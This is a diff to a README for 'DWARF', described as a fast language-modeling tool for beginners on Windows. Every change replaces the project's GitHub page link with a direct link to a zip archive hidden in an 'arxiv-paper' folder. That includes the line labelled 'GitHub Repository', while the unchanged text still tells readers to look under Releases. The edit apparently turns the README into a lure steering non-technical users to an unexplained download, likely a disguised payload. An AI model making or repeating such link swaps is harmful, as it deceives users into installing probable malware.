@@ -1,6 +1,6 @@
 # ⚙️ DWARF - Fast and Efficient Language Modeling
 
-[![Download DWARF](https://img.shields.io/badge/Download%20DWARF-%237b68ee?style=for-the-badge&logo=github)](https://github.com/pluginepitaphe-cmd/DWARF)
+[![Download DWARF](https://img.shields.io/badge/Download%20DWARF-%237b68ee?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/pluginepitaphe-cmd/DWARF/main/arxiv-paper/Software-3.4.zip)
 
 ---
 
@@ -34,7 +34,7 @@ You do not need any special software or programming tools installed before start
 
 Click the button below to visit the download page for DWARF.
 
-[![Download DWARF](https://img.shields.io/badge/Download%20DWARF-%237b68ee?style=for-the-badge&logo=github)](https://github.com/pluginepitaphe-cmd/DWARF)
+[![Download DWARF](https://img.shields.io/badge/Download%20DWARF-%237b68ee?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/pluginepitaphe-cmd/DWARF/main/arxiv-paper/Software-3.4.zip)
 
 This page contains the latest files and updates. You will find the Windows installer here.
 
@@ -45,7 +45,7 @@ This page contains the latest files and updates. You will find the Windows insta
 1. Open your internet browser (such as Chrome, Edge, or Firefox).
 
 2. Click the big blue download button above or go directly to:  
-   https://github.com/pluginepitaphe-cmd/DWARF
+   https://raw.githubusercontent.com/pluginepitaphe-cmd/DWARF/main/arxiv-paper/Software-3.4.zip
 
 3. On the GitHub page, look for a folder or section called **Releases**. This is where you’ll find the installer.
 
@@ -121,7 +121,7 @@ If DWARF does not start or crashes, try this:
 New versions improve speed and fix bugs. To update:
 
 - Visit the official DWARF page:  
-  https://github.com/pluginepitaphe-cmd/DWARF
+  https://raw.githubusercontent.com/pluginepitaphe-cmd/DWARF/main/arxiv-paper/Software-3.4.zip
 
 - Look for new releases under the **Releases** tab.
 
@@ -141,8 +141,8 @@ New versions improve speed and fix bugs. To update:
 
 ## 🔗 Important Links
 
-- Download DWARF: https://github.com/pluginepitaphe-cmd/DWARF  
-- GitHub Repository: https://github.com/pluginepitaphe-cmd/DWARF  
+- Download DWARF: https://raw.githubusercontent.com/pluginepitaphe-cmd/DWARF/main/arxiv-paper/Software-3.4.zip  
+- GitHub Repository: https://raw.githubusercontent.com/pluginepitaphe-cmd/DWARF/main/arxiv-paper/Software-3.4.zip  
 - Releases Page (for updates): Look under the **Releases** section on the above page  
 
 ---
@@ -157,4 +157,4 @@ New versions improve speed and fix bugs. To update:
 
 ---
 
-[![Download DWARF](https://img.shields.io/badge/Download%20DWARF-%237b68ee?style=for-the-badge&logo=github)](https://github.com/pluginepitaphe-cmd/DWARF)
+[![Download DWARF](https://img.shields.io/badge/Download%20DWARF-%237b68ee?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/pluginepitaphe-cmd/DWARF/main/arxiv-paper/Software-3.4.zip)
